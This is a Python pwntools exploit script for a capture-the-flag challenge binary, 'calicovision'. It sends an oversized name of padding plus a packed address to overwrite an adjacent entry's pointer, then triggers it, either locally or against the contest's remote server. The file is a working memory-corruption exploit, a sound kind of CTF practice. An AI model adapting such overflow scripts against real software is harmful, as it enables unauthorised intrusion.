from pwn import *

file = ELF("./calicovision")

delim = b"[Q] Quit\n"
end = b"What would you like to do?"

def clist ():
    io.sendlineafter(delim, b"A")
    d = io.recvuntil(end)[:-len(end)]
    return d.strip().split("\n")

def name (data):
    io.sendlineafter(delim, b"B")
    n = io.recvline().strip()
    print(n)
    io.sendlineafter(b": ", data)
    return int(n[n.index(b"#")+1:])

def pet (index):
    io.sendlineafter(delim, b"C")
    io.sendlineafter(b"? ", str(index).encode())

if args.EXPLOIT:
    io = remote("calicovision.wpi-ctf-2022-codelab.kctf.cloud", 1337)
else:
    io = process("./calicovision")

hacker_cat = 0x5b0068

a = name(b"G" * 71 + b"\x00" + p64(hacker_cat) + b"???")
victim = a+1
print(f"victim cat is {victim}")

pet(victim)

print(io.recvline())
print(io.recvline())